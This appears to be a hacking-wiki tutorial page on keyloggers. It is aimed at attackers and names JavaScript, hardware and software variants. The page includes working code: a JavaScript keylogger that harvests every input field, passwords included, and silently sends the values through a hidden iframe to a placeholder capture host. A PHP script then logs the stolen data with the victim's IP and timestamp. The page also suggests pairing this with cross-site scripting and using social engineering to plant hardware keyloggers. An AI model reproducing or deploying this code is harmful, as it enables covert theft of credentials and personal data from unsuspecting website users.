Keylogging is the fact of recording the keys pressed by the user when entering data so that you can know what the target typed, including passwords and crap.

# Javascript keylogger  #

The most used one concerning website hacking.
<pre>//---Javascript
//This is an example of a keylogger. There is also a php file on this article you can use to capture the data.
randVal = 'loldongs'+(Math.round((10000-5000) * Math.random() + 5000));
wp='<div style=":display:block;width:0;height:0;z-index:0;overflow:hidden;" id="'+randVal+'"></div>';
window.onload=function(){
	window.document.body.innerHTML='<div onkeyup="kl();">'+window.document.body.innerHTML+wp+'</div>';
}
function kl(){
	inp=document.getElementsByTagName('input');
	qs='';
	for(var i = 0; i < inp.length; i++){
		qs=qs+i+'_'+inp[i].name+'='+inp[i].value+'&';
	}
	cn=document.getElementById(randVal);
	kf='<iframe style="width:0;height:0;" src="http://CAPTUREHOST/capture.php?'+qs+'"></iframe>';
	cn.innerHTML=kf;
}</pre>

This sample basically calls the kl() function each time a key is pressed. This one sends the reference of the key(s) to this script, on the hacker's server :
<pre>//---capture.php
//This will catch all data passed as querystrings and save them in a readable format with IP, referrer & timestamp 
<?php
	$dumpFile = "dump";
	$fh = fopen($dumpFile, 'a') or die("can't open file");
	fwrite($fh, date("m/d/y_g:i:s").'|'.$_SERVER['REMOTE_ADDR'].'|'.$_SERVER['HTTP_REFERER'].'|');
	foreach($_GET as $qs => $val){
		fwrite($fh, $qs."=".$val.'|');
	}
	fwrite($fh, "\n");
	fclose($fh);
?></pre>

Everything is stored in the dumpfile and a normal user can't see he is being spied on.
This kind of keylogger is often used in combination with [Cross site scripting](/Cross_site_scripting).

# Hardware keylogger  #

This one is a tiny device more often than not plugged between the computer and the keyboard of the target. Since this is a real life hack, you may use [Social Engineering](/Social_Engineering) in order to gain access to the target's office or such.
If you want to know more about these : [Wikipedia](http://anonym.to/http://en.wikipedia.org/wiki/Hardware_keylogger)

# Software keylogger  #

Often implemented via as virus or such, this keylogger runs on the target's computer like a normal program and logs every key he press.

## Linux  ##


* [LKL](http://anonym.to/http://sourceforge.net/projects/lkl/)
* [Uberkey](http://anonym.to/http://distrojockey.com/2005/ultimate-linux-keylogger-uberkey.190.linux)

## Wind$  ##

_To be completed_

* [MyHook](http://sourceforge.net/projects/myhook/) is a shitty keylogger, however, it's opensource, so anyone with C++ knowledge should be able to adapt it to his needs
{{Tutorials}}

